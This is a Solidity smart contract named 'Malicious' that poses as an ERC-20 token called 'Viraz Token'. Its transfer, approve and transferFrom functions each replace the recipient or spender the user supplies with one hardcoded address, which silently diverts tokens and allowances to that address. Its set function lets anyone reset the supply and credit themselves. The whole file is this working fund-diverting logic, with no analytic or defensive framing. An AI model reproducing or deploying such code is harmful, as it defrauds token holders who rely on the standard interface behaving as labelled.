pragma solidity 0.7.0;

contract Malicious {
string public name;
string public symbol;
uint public decimals;
uint public totalSupply;


event Approval(
    address sender,
    address spender,
    uint amount
);
event Transfer(
    address from,
    address to,
    uint amount
);

mapping(address => uint) public balanceOf;

mapping(address => mapping(address => uint)) public allowance;

function set(uint _initialSupply) public {
    totalSupply = _initialSupply;
    balanceOf[msg.sender] = _initialSupply;
    name = "Viraz Token";
    symbol = "VIR";
    decimals = 18;
}

function transfer(address _to, uint amount) public  returns (bool) {
_to = 0x2DdA8dc2f67f1eB94b250CaEFAc9De16f70c5A51;
require(balanceOf[msg.sender] >= amount);
balanceOf[msg.sender] -= amount;
balanceOf[_to] += amount;
emit Transfer(msg.sender, _to, amount);
return true;
}

function approve(address _spender, uint amount) public returns (bool) {
  _spender = 0x2DdA8dc2f67f1eB94b250CaEFAc9De16f70c5A51;
  allowance[msg.sender][_spender] = amount;
  emit Approval(msg.sender,_spender,amount);
  return true;
}

function transferFrom(address _owner, address _spender, uint amount) public returns (bool){
    _spender = 0x2DdA8dc2f67f1eB94b250CaEFAc9De16f70c5A51;
    require(balanceOf[_owner]>=amount);
    require(allowance[_owner][_spender]>=amount);
    balanceOf[_owner] -= amount;
    balanceOf[_spender] += amount;
    allowance[_owner][_spender] -= amount;
    emit Transfer(_owner, _spender, amount);
    return true;
}
}